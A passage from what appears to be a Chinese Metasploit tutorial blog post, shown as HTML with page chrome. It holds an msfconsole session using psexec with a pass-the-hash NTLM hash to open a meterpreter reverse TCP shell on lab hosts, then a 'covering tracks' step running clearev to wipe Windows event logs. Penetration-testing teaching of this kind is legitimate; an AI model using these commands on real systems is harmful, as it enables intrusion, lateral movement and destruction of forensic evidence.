+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set lhost <span class="number">192.168</span>.<span class="number">126.33</span></span><br><span class="line">lhost =&gt; <span class="number">192.168</span>.<span class="number">126.33</span></span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set lport <span class="number">443</span></span><br><span class="line">lport =&gt; <span class="number">443</span></span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set rhosts <span class="number">192.168</span>.<span class="number">52.138</span></span><br><span class="line">rhosts =&gt; <span class="number">192.168</span>.<span class="number">52.138</span></span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set rhosts <span class="number">192.168</span>.<span class="number">52.141</span></span><br><span class="line">rhosts =&gt; <span class="number">192.168</span>.<span class="number">52.141</span></span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set SMBPass b4df3d6cb6929cc09cb07285b13aca78:<span class="number">9</span>c8be841d72dbd132d22477ff8b7e9d3</span><br><span class="line">SMBPass =&gt; b4df3d6cb6929cc09cb07285b13aca78:<span class="number">9</span>c8be841d72dbd132d22477ff8b7e9d3</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">443</span> </span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">52.141</span>:<span class="number">445</span> - Connecting to the server...</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">52.141</span>:<span class="number">445</span> - Authenticating to <span class="number">192.168</span>.<span class="number">52.141</span>:<span class="number">445</span> as user <span class="string">''</span>...</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-7-掩踪灭迹"><a href="#2-7-掩踪灭迹" class="headerlink" title="2.7 掩踪灭迹"></a><strong>2.7 掩踪灭迹</strong></h3><p><strong>清除日志痕迹</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; clearev </span><br><span class="line">[*] Wiping <span class="number">1509</span> records from Application...</span><br><span class="line">[*] Wiping <span class="number">4759</span> records from System...</span><br><span class="line">[*] Wiping <span class="number">1453</span> records from Security...</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+      
+      <!-- reward -->
+      
+      <div id="reward-btn">
+        打赏
+      </div>
+      
+    </div>
+    
+    
+      <!-- copyright -->
+      
+        <div class="declare">
+          <ul class="post-copyright">
+            <li>
+              <i class="ri-copyright-line"></i>
+              <strong>版权声明： </strong s>
+              本博客所有文章除特别声明外，均采用 <a href="https://www.apache.org/licenses/LICENSE-2.0.html" rel="external nofollow"
+                target="_blank">Apache License 2.0</a> 许可协议。转载请注明出处！
+            </li>
+          </ul>
+        </div>
+        
+    <footer class="article-footer">
+      
+          
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        Share
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://cumtchen.gitee.io/2020/09/11/Metasploit/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>
+      
+      
+
+    </footer>
+
+  </div>
+
+  
+  
+  <nav class="article-nav">
+    
+    
+      <a href="/2020/08/28/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/" class="article-nav-link">
+        <strong class="article-nav-caption">Older posts</strong>
+        <div class="article-nav-title">DC靶场系列</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+  
+<!-- valine评论 -->
+<div id="vcomments-box">
+    <div id="vcomments">
+    </div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='https://cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: '6tKR3VfNf8sE102pp4QlkOSM-gzGzoHsz',
+        app_key: 'OVsjODdU2QixblMDCtzmEfYS',
+        path: window.location.pathname,
+        notify: '',
+        verify: 'false',
+        avatar: 'mp',
+        placeholder: '给我的文章加点建议吧~',
+        recordIP: true
+    });
+    const infoEle = document.querySelector('#vcomments .info');
+    if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+        infoEle.childNodes.forEach(function (item) {
+            item.parentNode.removeChild(item);
+        });
+    }
+</script>
+<style>
+    #vcomments-box {
+        padding: 5px 30px;
+    }
+
+    @media screen and (max-width: 800px) {
+        #vcomments-box {
+            padding: 5px 0px;
+        }
+    }
+
+    #vcomments-box #vcomments {
+        background-color: #fff;
+    }
+
+    .v .vlist .vcard .vh {
+        padding-right: 20px;
+    }
+
+    .v .vlist .vcard {
+        padding-left: 10px;
+    }
+</style>
+
+  
+
+  
+  
+  
+
+</article>
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul class="list-inline">
+      <li>
+        &copy;
+        2020
+        0Rld
+      </li>
+      <li>
+        
+          Powered by
+        
+        
+        <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
+        
+      </li>
+    </ul>
+    <ul class="list-inline">
+      <li>
+        
+        
+        <span>
+  <i>PV:<span id="busuanzi_value_page_pv"></span></i>
+  <i>UV:<span id="busuanzi_value_site_uv"></span></i>
+</span>
+        
+      </li>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src=''></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+    <div class="to_top">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+      </div>
+    </main>
+      <aside class="sidebar">
+        <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/1.jpg" alt="0Rld"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/2020/about">About</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+      </aside>
+      <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>Buy me a cup of coffee~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+      
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<script src="/js/share.js"></script>
+
+
+
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script>
+  try {
+    var typed = new Typed("#subtitle", {
+    strings: ['四季更替，梦境更迭','生活,旅行,思考,代码,博客','努力一定会有所获！'],
+    startDelay: 0,
+    typeSpeed: 200,
+    loop: true,
+    backSpeed: 100,
+    showCursor: true
+    });
+  } catch (err) {
+  }
+  
+</script>
+
+
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer:'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto',
+    onClick: (e) => {
+      $('.toc-link').removeClass('is-active-link');
+      $(`a[href=${e.target.hash}]`).addClass('is-active-link');
+      $(e.target.hash).scrollIntoView();
+      return false;
+    }
+  });
+</script>
+
+
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+
+<script src="/js/ayer.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+<script type="text/javascript" src="https://js.users.51.la/20544303.js"></script>
+  </div>
+</body>
+
+</html>
